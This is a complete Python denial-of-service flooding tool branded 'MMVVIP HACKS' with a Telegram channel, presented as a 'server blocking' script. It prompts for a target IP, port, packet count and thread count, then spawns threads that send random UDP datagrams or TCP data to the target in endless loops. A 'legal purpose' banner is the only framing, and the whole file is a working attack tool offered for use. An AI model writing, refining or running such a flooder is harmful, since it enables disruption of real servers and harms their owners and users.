#!/usr/bin/env python3
import random
import socket
import threading

print("-->MMVVIP HACKS t.me/mmvvip <--")
print("-->Channel - MM_fantom<--")
print("-->ONLY FOR LEGAL PURPOSE<--")
print("MMVVIP SERVER BLOCKING")
ip = str(input("*MMVVIP* IP :"))
port = int(input("*MMVVIP* PORT :"))
choice = str(input("*MMVVIP* UDP (y/n):"))
times = int(input(" Packets Per Time eg.[1000]:"))
threads = int(input(" Threads: eg [1000]"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
